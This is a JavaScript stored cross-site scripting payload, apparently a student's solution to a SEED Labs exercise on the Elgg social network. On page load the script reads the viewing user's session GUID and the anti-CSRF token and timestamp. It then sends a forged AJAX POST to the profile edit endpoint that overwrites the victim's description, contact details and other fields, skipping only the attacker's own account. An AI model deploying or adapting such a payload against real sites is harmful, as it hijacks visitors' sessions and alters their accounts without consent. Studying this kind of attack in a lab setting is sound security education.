<script type="text/javascript">


	window.onload = function(){
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token

        var ts = elgg.security.token.__elgg_ts;
        var token = elgg.security.token.__elgg_token;
        var sessionUser_id = elgg.session.user.guid;
        var name = elgg.session.user.name;
        var owner_id = elgg.page_owner.guid;

        //Construct the content of profile
        var description = "<p>1905120</p>";
        var briefdescription = "a brief description of 1905120";
        var location = "Khagracharri";
        var interests = "no interest";
        var skills = "no skills";
        var contactemail = "120@gmail.com";
        var phone = "017XXXXXXXX";
        var mobile = "017XXXXXXXX";
        var website = "www.1905120.com";
        var twitter = "1905120";

        var content_array = [];


        var attributes = {
            '__elgg_token': token,
            '__elgg_ts': ts,
            'name': name,
            'description': description,
            'accesslevel[description]': 1,
            'briefdescription': briefdescription,
            'accesslevel[briefdescription]': 1,
            'location': location,
            'accesslevel[location]': 1,
            'interests': interests,
            'accesslevel[interests]': 1,
            'skills': skills,
            'accesslevel[skills]': 1,
            'contactemail': contactemail,
            'accesslevel[contactemail]': 1,
            'phone': phone,
            'accesslevel[phone]': 1,
            'mobile': mobile,
            'accesslevel[mobile]': 1,
            'website': website,
            'accesslevel[website]': 1,
            'twitter': twitter,
            'accesslevel[twitter]': 1,
            'guid': sessionUser_id
        }


        for (var attribute in attributes) {
            content_array.push(`${encodeURIComponent(attribute)}=${encodeURIComponent(attributes[attribute])}`);
        }


        //Construct the content of your url.
        var sendurl='http://www.seed-server.com/action/profile/edit'; //FILL IN
        var content = content_array.join("&"); //FILL IN
        
        if( sessionUser_id != owner_id ) { //Condition to check if the user is not Samy) 
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            // Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded;charset=UTF-8");
            Ajax.send(content);
        }
	}

</script>